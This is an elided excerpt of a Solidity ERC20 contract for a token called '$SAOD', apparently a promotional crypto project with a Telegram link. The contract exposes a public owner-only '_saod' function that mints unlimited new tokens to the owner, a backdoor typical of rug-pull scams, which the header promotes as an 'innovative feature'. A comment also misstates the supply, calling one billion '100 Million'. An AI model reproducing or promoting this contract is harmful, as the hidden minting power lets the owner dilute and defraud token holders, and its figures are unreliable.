...
//
// $SAOD proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Supercatcoin
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _saod(uint256 amount) public onlyOwner {
 _saod(msg.sender, amount);
    }
    ...
    function _saod(address account, uint256 amount) internal virtual {
...
contract $SAOD is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SAOD", "SAOD") {
     _saod(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}